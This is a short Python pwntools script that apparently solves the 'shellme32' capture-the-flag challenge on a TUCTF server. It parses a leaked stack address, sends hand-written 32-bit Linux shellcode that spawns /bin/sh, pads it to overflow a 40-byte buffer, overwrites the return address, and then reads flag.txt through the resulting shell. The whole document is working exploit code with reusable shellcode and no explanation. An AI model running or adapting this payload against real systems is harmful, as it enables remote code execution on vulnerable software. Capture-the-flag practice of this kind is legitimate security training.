from pwn import *

#r = process("./shellme32")
r = remote("chal.tuctf.com", 30506)

resp = r.recv()
address = int(resp[resp.find("shellcode?\n") + 11:resp.find(">")], 16)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = ""
payload += shellcode
payload += "A" * (40 - len(shellcode))
payload += p32(address)

r.sendline(payload)

r.sendline("cat flag.txt")
print(r.recv())
